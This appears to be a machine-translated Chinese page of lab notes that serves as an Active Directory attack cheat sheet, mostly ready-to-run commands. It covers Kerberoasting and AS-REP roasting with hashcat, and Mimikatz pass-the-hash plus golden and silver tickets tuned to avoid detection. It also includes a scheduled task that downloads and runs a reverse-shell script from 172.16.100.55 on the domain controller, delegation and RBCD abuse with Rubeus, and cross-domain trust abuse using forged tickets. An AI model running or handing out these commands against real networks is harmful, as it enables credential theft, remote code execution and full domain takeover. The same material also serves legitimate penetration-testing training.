+<h2 id="横向运动"><a href="#横向运动" class="headerlink" title="横向运动"></a>横向运动</h2><h3 id="使用PowerView进行横向运动枚举"><a href="#使用PowerView进行横向运动枚举" class="headerlink" title="使用PowerView进行横向运动枚举"></a>使用PowerView进行横向运动枚举</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找用户的现有本地管理员访问权限（noisy 🚩）</span></span><br><span class="line">Find-LocalAdminAccess</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过PS远程处理（also noisy🚩）查找本地管理员访问权限，需要Find-PSRemotingLocalAdminAccess.ps1</span></span><br><span class="line">Get-NetComputer -Domain dollarcorp.moneycorp.local &gt; .\targets.txt</span><br><span class="line">Find-PSRemotingLocalAdminAccess -ComputerFile .\targets.txt dcorp-std355</span><br><span class="line"></span><br><span class="line"><span class="comment"># 与WMI相同。是否需要“ Find-WMILocalAdminAccess.ps1”（似乎已从Nishang中删除了）？</span></span><br><span class="line">Find-WMILocalAdminAccess -ComputerFile .\targets.txt</span><br><span class="line">Find-WMILocalAdminAccess <span class="comment"># Finds domain computers automatically</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在您可以访问的机器上搜寻有趣的用户会话 (still noisy 🚩)</span></span><br><span class="line">Invoke-UserHunter -CheckAccess | ?&#123;<span class="variable">$_</span>.LocalAdmin <span class="nomarkup">-Eq</span> True &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找 kerberoastable users</span></span><br><span class="line">Get-DomainUser -SPN | select name,serviceprincipalname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找 AS-REP roastable users</span></span><br><span class="line">Get-DomainUser -PreauthNotRequired | select name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 寻找可以设置UserAccountControl标志的用户</span></span><br><span class="line"><span class="comment">## 如果可用-禁用预身份验证或添加SPN（请参见下文）</span></span><br><span class="line">Invoke-ACLScanner -ResolveGUIDs | ?&#123;<span class="variable">$_</span>.IdentityReferenceName <span class="nomarkup">-match</span> <span class="string">"RDPUsers"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找启用了无限制委派的服务器</span></span><br><span class="line"><span class="comment">## 如果可用，并且您在此服务器上具有管理员权限，请获取用户TGT（请参见下文）</span></span><br><span class="line">Get-DomainComputer -Unconstrained</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找启用了约束委派的用户或计算机</span></span><br><span class="line"><span class="comment">## 如果可用，并且您具有用户/计算机哈希，请以DA身份访问服务机（请参见下文）</span></span><br><span class="line">Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto</span><br><span class="line">Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>使用<code>Invoke-BloodHound</code>from<code>SharpHound.ps1</code>或use <code>SharpHound.exe</code>。两者都可以反思地运行，把它们放到<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors" target="_blank" rel="noopener">这里</a>。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果您不关心OpSec，请运行所有检查🚩</span></span><br><span class="line">Invoke-BloodHound -CollectionMethod All,GPOLocalGroup</span><br><span class="line"></span><br><span class="line"><span class="comment"># Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts 🚩</span></span><br><span class="line">Invoke-BloodHound -CollectionMethod LoggedOn</span><br></pre></td></tr></table></figure>
+<h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><h4 id="Automatic"><a href="#Automatic" class="headerlink" title="Automatic"></a>Automatic</h4><p>使用PowerView：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request-SPNTicket -SPN <span class="string">"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"</span></span><br></pre></td></tr></table></figure>
+<p>使用Hashcat破解哈希：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 13100 hash.txt `<span class="built_in">pwd</span>`/rockyou.txt --rules-file `<span class="built_in">pwd</span>`/hashcat/rules/best64.rule</span><br></pre></td></tr></table></figure>
+<h4 id="Manual"><a href="#Manual" class="headerlink" title="Manual"></a>Manual</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 请求TGS进行kerberoastable帐户（SPN）</span></span><br><span class="line"><span class="built_in">Add-Type</span> -AssemblyName System.IdentityModel</span><br><span class="line"><span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将TGS转储到磁盘</span></span><br><span class="line">Invoke-Mimikatz -Command <span class="string">'"kerberos::list /export"'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用TGSRepCrack破解</span></span><br><span class="line">python.exe .\tgsrepcrack.py .\<span class="number">10</span>k-worst-pass.txt .\mssqlsvc.kirbi</span><br></pre></td></tr></table></figure>
+<h4 id="Targeted-kerberoasting-by-setting-SPN"><a href="#Targeted-kerberoasting-by-setting-SPN" class="headerlink" title="Targeted kerberoasting by setting SPN"></a>Targeted kerberoasting by setting SPN</h4><p>我们需要ACL写入权限才能为该用户设置UserAccountControl标志，有关搜索，请参见上文。使用PowerView：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity support355user -Set @&#123;serviceprincipalname=<span class="string">'any/thing'</span>&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="AS-REP-roasting"><a href="#AS-REP-roasting" class="headerlink" title="AS-REP roasting"></a>AS-REP roasting</h3><p>获取可焙烤用户的哈希（有关搜索，请参见上文）。使用<code>ASREPRoast.ps1</code>：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ASREPHash -UserName VPN355user</span><br></pre></td></tr></table></figure>
+<p>使用Hashcat破解哈希：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 18200 hash.txt `<span class="built_in">pwd</span>`/rockyou.txt --rules-file `<span class="built_in">pwd</span>`/hashcat/rules/best64.rule</span><br></pre></td></tr></table></figure>
+<h4 id="通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游"><a href="#通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游" class="headerlink" title="通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游"></a><strong>通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游</strong></h4><p>我们需要ACL写入权限才能为该用户设置UserAccountControl标志，有关搜索，请参见上文。使用PowerView。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity Control355User -XOR @&#123;useraccountcontrol=<span class="number">4194304</span>&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Token-Manipulation"><a href="#Token-Manipulation" class="headerlink" title="Token Manipulation"></a>Token Manipulation</h3><p>可以通过计算机上的会话/运行进程从其他用户模仿令牌。通过使用例如CobaltStrike注入到所述过程中可以实现类似的效果。</p>
+<h4 id="Incognito"><a href="#Incognito" class="headerlink" title="Incognito"></a>Incognito</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在机器上显示令牌</span></span><br><span class="line">.\incognito.exe list_tokens -u</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用特定用户的令牌启动新过程</span></span><br><span class="line">.\incognito.exe execute -c <span class="string">"domain\user"</span> C:\Windows\system32\calc.exe</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果您使用Meterpreter，则可以将内置的Incognito模块与一起使用，可以使用<code>use incognito</code>相同的命令。</p>
+</blockquote>
+<h4 id="Invoke-TokenManipulation"><a href="#Invoke-TokenManipulation" class="headerlink" title="Invoke-TokenManipulation"></a>Invoke-TokenManipulation</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示机器上的所有令牌</span></span><br><span class="line">Invoke-TokenManipulation -ShowAll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅在机器上显示唯一的，可用的令牌</span></span><br><span class="line">Invoke-TokenManipulation -Enumerate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用特定用户的令牌启动新过程</span></span><br><span class="line">Invoke-TokenManipulation -ImpersonateUser -Username <span class="string">"domain\user"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用另一个进程的令牌启动新进程</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">"C:\Windows\system32\calc.exe"</span> -ProcessId <span class="number">500</span></span><br></pre></td></tr></table></figure>
+<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Overpass the hash</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:[NTLMHASH] /run:powershell.exe</span><br><span class="line"></span><br><span class="line"># 黄金票据 (domain admin, w/ some ticket properties to avoid detection)</span><br><span class="line">kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt</span><br><span class="line"></span><br><span class="line"># 白银票据 for a specific SPN with a compromised service / machine account</span><br><span class="line">kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.domain.local /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可在<a href="https://adsecurity.org/?page_id=183" target="_blank" rel="noopener">此处</a>找到用于银票的可用SPN列表。<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md#pass-the-ticket-silver-tickets" target="_blank" rel="noopener">这里</a>提供<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Active Directory Attack.md#pass-the-ticket-silver-tickets" target="_blank" rel="noopener">了</a>与攻击相关的SPN的另一个不错的概述。</p>
+</blockquote>
+<h3 id="使用schtasks执行命令"><a href="#使用schtasks执行命令" class="headerlink" title="使用schtasks执行命令"></a><strong>使用schtasks执行命令</strong></h3><p><em>需要“主机” SPN</em></p>
+<p>创建任务：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注意引号。如果引用变得很痛苦，请使用编码的命令。</span></span><br><span class="line">schtasks /create /tn <span class="string">"shell"</span> /ru <span class="string">"NT Authority\SYSTEM"</span> /s dcorp-dc.dollarcorp.moneycorp.local /sc weekly /tr <span class="string">"Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"</span></span><br></pre></td></tr></table></figure>
+<p>触发它：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /RUN /TN <span class="string">"shell"</span> /s dcorp-dc.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>
+<h3 id="使用WMI执行命令"><a href="#使用WMI执行命令" class="headerlink" title="使用WMI执行命令"></a><strong>使用WMI执行命令</strong></h3><p><em>需要“主机”和“ RPCSS” SPN</em></p>
+<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WmiMethod</span> win32_process -ComputerName dcorp-dc.dollarcorp.moneycorp.local -name create -argumentlist <span class="string">"powershell.exe -e <span class="variable">$encodedCommand</span>"</span></span><br></pre></td></tr></table></figure>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用password</span></span><br><span class="line">impacket-wmiexec dcorp/student355:password@172.16.4.101</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用hash</span></span><br><span class="line">impacket-wmiexec dcorp/student355@172.16.4.101 -hashes :92F4AE6DCDAC7CF870B79F1758503D54</span><br></pre></td></tr></table></figure>
+<h3 id="使用PowerShell-Remoting执行命令"><a href="#使用PowerShell-Remoting执行命令" class="headerlink" title="使用PowerShell Remoting执行命令"></a><strong>使用PowerShell Remoting执行命令</strong></h3><p><em>需要“ CIFS”，“ HTTP”和“ WSMAN” SPN</em></p>
+<blockquote>
+<p>这个有点棘手。上述SPN的组合可能有效或无效-PowerShell也可能要求提供准确的FQDN。</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建凭据以其他用户身份运行（如果需要，PTT不需要）</span></span><br><span class="line"><span class="comment"># 如果不使用以下命令，请在以下命令中忽略-Credential $ Cred</span></span><br><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">'thePassword'</span> -AsPlainText -Force</span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">'CORP\username'</span>, <span class="variable">$SecPassword</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程运行命令（可以一对多使用！）</span></span><br><span class="line"><span class="built_in">Invoke-Command</span> -Credential <span class="variable">$Cred</span> -ComputerName <span class="variable">$computer</span> -ScriptBlock &#123;whoami; hostname&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以其他用户身份启动会话（提示输入密码）</span></span><br><span class="line"><span class="built_in">Enter-PsSession</span> -Credential <span class="variable">$Cred</span> -ComputerName <span class="variable">$computer</span> -Credential dcorp\Administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个持久会话（将记住变量等），将脚本加载到该会话中，然后输入远程会话提示</span></span><br><span class="line"><span class="variable">$sess</span> = <span class="built_in">New-PsSession</span> -Credential <span class="variable">$Cred</span></span><br><span class="line"><span class="built_in">Invoke-Command</span> -Session <span class="variable">$sess</span> -FilePath c:\path\to\file.ps1</span><br><span class="line"><span class="built_in">Enter-PsSession</span> -Session <span class="variable">$sess</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在活动的PowerShell远程会话之间复制文件或从中复制文件</span></span><br><span class="line"><span class="built_in">Copy-Item</span> -Path .\Invoke-Mimikatz.ps1 -ToSession <span class="variable">$sess2</span> -Destination <span class="string">"C:\Users\dbprodadmin\documents\"</span></span><br></pre></td></tr></table></figure>
+<h3 id="不受限制的委托"><a href="#不受限制的委托" class="headerlink" title="不受限制的委托"></a><strong>不受限制的委托</strong></h3><p>可以在<em>前端服务</em>（例如IIS Web服务器）上设置，以允许它代表用户委派<em>域中的任何服务</em>（向<em>后端服务</em>（例如MSSQL数据库））。</p>
+<p>DACL UAC属性： <code>TrustedForDelegation</code>.</p>
+<h4 id="Exploitation-1"><a href="#Exploitation-1" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>在设置了无限制委派的服务器上具有管理特权时，我们可以为具有连接的其他用户转储TGT。使用Mimikatz：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::tickets /export</span><br><span class="line">kerberos::ptt c:\path\to\ticket.kirbi</span><br></pre></td></tr></table></figure>
+<p>或与Rubeus一起使用</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe klist</span><br><span class="line">.\Rubeus.exe dump /luid:<span class="number">0</span>x5379f2 /nowrap</span><br><span class="line">.\Rubeus.exe ptt /ticket:doIFSDCC[...]</span><br></pre></td></tr></table></figure>
+<p>如果该DC容易受到打印机错误的影响，我们还可以获得域控制器计算机帐户的哈希值。在具有无限制委派的服务器上，使用Rubeus监视新票证。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe monitor /interval:<span class="number">5</span> /nowrap</span><br></pre></td></tr></table></figure>
+<p>从攻击机上诱使域控制器使用打印机错误进行连接。从<a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener">这里</a>二进制。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>
+<p>DC的机器帐户的TGT应该在第一个会话中出现。我们可以传递此票证以获得DCSync特权。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe ptt /ticket:doIFxTCCBc...</span><br></pre></td></tr></table></figure>
+<h3 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a><strong>约束委派</strong></h3><p>可以在<em>前端服务器</em>（例如IIS）上设置约束委派，以允许它代表用户<em>仅</em>委派给<em>选定的后端服务</em>（例如MSSQL）。</p>
+<p>DACL UAC属性：<code>TrustedToAuthForDelegation</code>。这允许<code>s4u2self</code>（即，仅使用NTLM密码哈希值）代表<em>任何人</em>自己请求TGS 。这有效地允许该服务仅使用他们的哈希来模拟域中的其他用户，并且在用户和前端之间不使用Kerberos的情况下非常有用。</p>
+<p>DACL属性：<code>msDS-AllowedToDelegateTo</code>。此属性包含允许在其上使用的SPN <code>s4u2proxy</code>，即基于现有TGS（例如，从中使用所获得的TGS）请求该服务器的可转发TGS <code>s4u2self</code>。这有效地定义了允许委派委派的后端服务。</p>
+<p><strong>注意：</strong>这些属性不一定必须并存！如果<code>s4u2proxy</code>不允许使用<code>s4u2self</code>，则需要用户交互才能从用户获得有效的TGS到前端服务，类似于无约束委派。</p>
+<h4 id="Exploitation-2"><a href="#Exploitation-2" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>在这种情况下，我们使用Rubeus自动请求TGT，然后使用带有<code>ldap</code>SPN的TGS，以允许我们使用计算机帐户进行DCSync。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get a TGT using the compromised service account with delegation set (if needed)</span></span><br><span class="line">.\Rubeus.exe asktgt /user:sa_with_delegation /domain:domain.com /rc4:<span class="number">2892</span>D26CDF84D7A70E2EB3B9F05C425E</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN</span></span><br><span class="line">.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Same as above, but access the LDAP service on the DC (for dcsync) using pw hash</span></span><br><span class="line">.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:<span class="number">2892</span>D26CDF84D7A70E2EB3B9F05C425E</span><br></pre></td></tr></table></figure>
+<h3 id="基于资源的约束委派"><a href="#基于资源的约束委派" class="headerlink" title="基于资源的约束委派"></a><strong>基于资源的约束委派</strong></h3><p>基于资源的约束委派（RBCD）将<em>后端服务器</em>（例如MSSQL）配置为<em>仅</em>允许<em>选定的前端服务</em>（例如IIS）代表用户进行委派。这使特定的服务器管理员可以更轻松地配置委派，而无需域管理员权限。</p>
+<p>DACL属性：<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>。</p>
+<p>在这种情况下，<code>s4u2self</code>并且和<code>s4u2proxy</code>一样用于代表用户请求可转发票证。但是，使用RBCD，KDC会检查<em>后端服务</em>的属性中是否存在用于请求服务（即<em>前端服务</em>）的SPN 。这意味着<em>前端服务</em>需要设置SPN。因此，必须从具有SPN的服务帐户或计算机帐户对RBC进行攻击。<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></p>
+<h4 id="Exploitation-3"><a href="#Exploitation-3" class="headerlink" title="Exploitation"></a>Exploitation</h4><p>如果我们损害出现在<em>后端服务</em>的RBCD属性中的<em>前端服务</em>，则利用与上面的受约束委派相同。但是，这不太常见。</p>
+<p>更经常看到攻击RBCD是当我们有<code>GenericWrite</code>，<code>GenericAll</code>，<code>WriteProperty</code>，或<code>WriteDACL</code>许可在域中的计算机对象。这意味着我们可以<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>在该计算机帐户上写入属性，以添加受信任的SPN或计算机帐户以进行委派。我们甚至可以创建一个新的计算机帐户并添加它。就像上面的约束委派一样，这使我们可以在任何用户的上下文中破坏目标计算机。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Create a new machine account using PowerMad</span></span><br><span class="line">New-MachineAccount -MachineAccount InconspicuousMachineAccount -Password $(<span class="built_in">ConvertTo-SecureString</span> <span class="string">'Compromised123!'</span> -AsPlainText -Force)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target</span></span><br><span class="line"><span class="variable">$sid</span> = Get-DomainComputer -Identity InconspicuousMachineAccount -Properties objectsid | Select -Expand objectsid</span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$(<span class="variable">$sid</span>))"</span></span><br><span class="line"><span class="variable">$SDbytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDbytes</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target</span></span><br><span class="line">Get-DomainComputer -Identity TargetSrv01 | Set-DomainObject -Set @&#123;<span class="string">'msdsallowedtoactonbehalfofotheridentity'</span>=<span class="variable">$SDBytes</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target</span></span><br><span class="line">.\Rubeus.exe s4u /user:InconspicuousMachineAccount$ /rc4:<span class="number">3644</span>AC5E3D9441CCBCEF08CBAF98E910 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv01.corp1.com /ptt</span><br></pre></td></tr></table></figure>
+<h3 id="滥用域信任"><a href="#滥用域信任" class="headerlink" title="滥用域信任"></a><strong>滥用域信任</strong></h3><p>必须以DA特权运行。</p>
+<h4 id="使用域信任密钥"><a href="#使用域信任密钥" class="headerlink" title="使用域信任密钥"></a><strong>使用域信任密钥</strong></h4><p>从DC中，<code>currentdomain\targetdomain$</code>使用<code>Mimikatz</code>（例如，使用<code>LSADump</code>或<code>DCSync</code>）转储信任帐户的哈希。然后，使用此信任密钥和域<code>SID</code>，使用<code>Mimikatz</code>伪造一个跨域<code>TGT</code>，将目标域的企业管理员组的<code>SID</code>添加到我们的“ <code>SID history</code>”中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi</span><br></pre></td></tr></table></figure>
+<p>使用Rubeus.</p>
+<blockquote>
+<p>确保您具有正确的Rubeus版本。由于某些原因，我的某些编译二进制文件给出了错误<code>KDC_ERR_WRONG_REALM</code>，而CRTP提供的版本可以正常工作。</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgs /ticket:c:\ad\tools\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt</span><br></pre></td></tr></table></figure>
+<p>现在，我们可以DCSync目标域（请参见下文）。</p>
+<h4 id="使用krbtgt哈希"><a href="#使用krbtgt哈希" class="headerlink" title="使用krbtgt哈希"></a><strong>使用krbtgt哈希</strong></h4><p>F从DC中，使用DCSync或LSADump转储krbtgt哈希。然后，像以前的方法一样，使用此哈希，使用Mimikatz伪造一个跨域TGT。</p>
+<p>使用SID历史（<code>/sids</code>的）<code>*-516</code>和<code>S-1-5-9</code>以伪装的域控制器组和企业域控制器分别是在日志中的噪声低。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:dcorp-dc$ /groups:516 /ptt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果您在创建此票证时遇到问题，请尝试添加“ target”标志，例如<code>/target:moneycorp.local</code>.</p>
+</blockquote>
+<p>或者，生成具有EA组的SID历史记录的域管理员票证。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt</span><br></pre></td></tr></table></figure>
+<p>现在，我们可以立即DCSync目标域，或使用计划任务获取反向shell。</p>
+<h3 id="滥用林间信任"><a href="#滥用林间信任" class="headerlink" title="滥用林间信任"></a><strong>滥用林间信任</strong></h3><p>由于林是安全边界，因此我们只能访问已与我们入侵的域（我们的源域）共享的域服务。使用例如BloodHound查找在两个林中都具有帐户（具有相同用户名）的用户，然后尝试重用密码。此外，我们可以使用PowerView来搜寻林之间的外部组成员身份。</p>
